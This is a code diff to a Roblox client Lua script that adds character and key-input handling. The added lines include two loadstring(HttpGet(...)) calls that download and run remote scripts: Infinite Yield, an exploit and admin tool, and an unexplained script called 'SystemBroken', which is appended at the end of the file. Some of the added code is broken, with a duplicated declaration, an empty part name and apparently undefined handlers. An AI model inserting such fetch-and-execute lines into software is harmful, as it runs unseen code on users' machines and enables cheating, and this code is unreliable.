@@ -619,6 +619,18 @@ local function CharacterAdded(Character)
 	end
 end
 
+if LocalPlayer.Character then
+	CharacterAdded(LocalPlayer.Character)
+end
+LocalPlayer.CharacterAdded:Connect(CharacterAdded)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local keyToHold = Enum.KeyCode.F
+
+local commandModule = ReplicatedStorage:FindFirstChild("CommandModule")
+
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 
@@ -647,6 +659,9 @@ UserInputService.InputEnded:Connect(function(input)
 	end
 end)
 
+UserInputService.InputBegan:Connect(onInputBegan)
+UserInputService.InputEnded:Connect(onInputEnded)
+
 local function modifyBaseplate()
     local baseplate = workspace:FindFirstChild("")
     if baseplate and baseplate:IsA("Part") then
@@ -656,3 +671,4 @@ local function modifyBaseplate()
     end
 end
 modifyBaseplate()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LAICHEMESSINFRRO283/SystemBroken/refs/heads/main/SystemBroken"))()
